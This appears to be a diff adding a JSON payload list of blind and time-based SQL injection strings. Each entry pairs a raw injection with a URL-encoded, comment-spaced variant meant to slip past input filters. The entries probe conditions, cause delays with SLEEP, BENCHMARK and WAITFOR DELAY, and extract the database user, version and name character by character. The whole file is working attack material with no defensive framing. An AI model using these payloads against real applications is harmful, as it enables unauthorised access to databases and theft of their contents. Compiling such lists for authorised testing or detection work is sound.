@@ -1,0 +1,182 @@
+[
+  {
+    "type": "sqli",
+    "original": "' AND 1=1--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/1%3D1--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND 1=2--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/1%3D2--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND 'a'='a'--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/%27a%27%3D%27a%27--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND 'a'='b'--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/%27a%27%3D%27b%27--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND EXISTS(SELECT * FROM users)--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/EXISTS%28SELECT/%2A%2A/%2A/%2A%2A/FROM/%2A%2A/users%29--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND NOT EXISTS(SELECT * FROM users)--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/NOT/%2A%2A/EXISTS%28SELECT/%2A%2A/%2A/%2A%2A/FROM/%2A%2A/users%29--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND (SELECT COUNT(*) FROM users)>0--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/COUNT%28%2A%29/%2A%2A/FROM/%2A%2A/users%29%3E0--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/COUNT%28%2A%29/%2A%2A/FROM/%2A%2A/information_schema.tables%29%3E0--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND (SELECT LENGTH(user())) > 0--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/LENGTH%28user%28%29%29%29/%2A%2A/%3E/%2A%2A/0--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND ASCII(SUBSTRING((SELECT user()),1,1))=114--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/ASCII%28SUBSTRING%28%28SELECT/%2A%2A/user%28%29%29%2C1%2C1%29%29%3D114--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND SLEEP(5)--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/SLEEP%285%29--%2B",
+    "bypass": "time"
+  },
+  {
+    "type": "sqli",
+    "original": "' OR IF(1=1, SLEEP(5), 0)--",
+    "payload": "%27/%2A%2A/OR/%2A%2A/IF%281%3D1%2C/%2A%2A/SLEEP%285%29%2C/%2A%2A/0%29--%2B",
+    "bypass": "time"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND IF(1=1,SLEEP(5),0)--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/IF%281%3D1%2CSLEEP%285%29%2C0%29--%2B",
+    "bypass": "time"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND BENCHMARK(1000000, MD5('a'))--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/BENCHMARK%281000000%2C/%2A%2A/MD5%28%27a%27%29%29--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND IF(ASCII(SUBSTRING((SELECT user()),1,1))>80, SLEEP(5), 0)--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/IF%28ASCII%28SUBSTRING%28%28SELECT/%2A%2A/user%28%29%29%2C1%2C1%29%29%3E80%2C/%2A%2A/SLEEP%285%29%2C/%2A%2A/0%29--%2B",
+    "bypass": "time"
+  },
+  {
+    "type": "sqli",
+    "original": "'; WAITFOR DELAY '00:00:05'--",
+    "payload": "%27%3B/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%2700%3A00%3A05%27--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "'; IF (1=1) WAITFOR DELAY '00:00:05'--",
+    "payload": "%27%3B/%2A%2A/IF/%2A%2A/%281%3D1%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%2700%3A00%3A05%27--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "'; IF EXISTS(SELECT * FROM users) WAITFOR DELAY '00:00:05'--",
+    "payload": "%27%3B/%2A%2A/IF/%2A%2A/EXISTS%28SELECT/%2A%2A/%2A/%2A%2A/FROM/%2A%2A/users%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%2700%3A00%3A05%27--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "'; IF LEN(user) > 1 WAITFOR DELAY '00:00:05'--",
+    "payload": "%27%3B/%2A%2A/IF/%2A%2A/LEN%28user%29/%2A%2A/%3E/%2A%2A/1/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%2700%3A00%3A05%27--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "'/**/AND/**/1=1--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/1%3D1--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "'/**/AND/**/'a'='a'--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/%27a%27%3D%27a%27--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "'/**/AND/**/EXISTS(SELECT/**/1)--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/EXISTS%28SELECT/%2A%2A/1%29--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "'/**/OR/**/1=1--",
+    "payload": "%27/%2A%2A/OR/%2A%2A/1%3D1--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "'/**/OR/**/'a'='a'--",
+    "payload": "%27/%2A%2A/OR/%2A%2A/%27a%27%3D%27a%27--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND ASCII(SUBSTRING((SELECT version()),1,1))=52--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/ASCII%28SUBSTRING%28%28SELECT/%2A%2A/version%28%29%29%2C1%2C1%29%29%3D52--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND ASCII(SUBSTRING((SELECT database()),1,1))=109--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/ASCII%28SUBSTRING%28%28SELECT/%2A%2A/database%28%29%29%2C1%2C1%29%29%3D109--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND ORD(MID((SELECT version()),1,1))=52--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/ORD%28MID%28%28SELECT/%2A%2A/version%28%29%29%2C1%2C1%29%29%3D52--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND (SELECT ASCII(SUBSTRING(@@version,1,1)))=77--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%29%3D77--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND (SELECT 1 & 1)--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/1/%2A%2A/%26/%2A%2A/1%29--%2B",
+    "bypass": "blind"
+  },
+  {
+    "type": "sqli",
+    "original": "' AND 1 ^ 0--",
+    "payload": "%27/%2A%2A/AND/%2A%2A/1/%2A%2A/%5E/%2A%2A/0--%2B",
+    "bypass": "blind"
+  }
+]
